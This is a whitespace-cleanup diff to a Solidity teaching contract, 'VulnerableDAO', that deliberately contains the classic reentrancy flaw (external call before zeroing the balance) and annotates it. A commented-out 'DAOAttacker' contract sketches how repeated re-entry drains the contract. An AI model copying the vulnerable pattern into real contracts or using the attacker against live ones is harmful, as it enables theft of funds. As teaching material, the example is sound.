@@ -38,7 +38,7 @@ contract VulnerableDAO {
 
     /**
      * @notice Withdraw all credited ETH
-     * 
+     *
      * VULNERABILITY IS HERE:
      * The function follows the pattern:
      * 1. Check balance (line 49)
@@ -55,7 +55,7 @@ contract VulnerableDAO {
             // VULNERABLE LINE: External call before state update
             bool callResult = msg.sender.call.value(oCredit)();
             require(callResult);
-            credit[msg.sender] = 0;  // This happens too late!
+            credit[msg.sender] = 0; // This happens too late!
         }
     }
 
@@ -73,16 +73,16 @@ contract VulnerableDAO {
  * contract DAOAttacker {
  *     VulnerableDAO public dao;
  *     uint256 public iterations = 0;
- *     
+ *
  *     constructor(address _dao) {
  *         dao = VulnerableDAO(_dao);
  *     }
- *     
+ *
  *     function attack() public payable {
  *         dao.deposit.value(msg.value)();
  *         dao.withdrawAll();
  *     }
- *     
+ *
  *     function() public payable {
  *         iterations++;
  *         if (iterations < 10 && address(dao).balance > 0) {
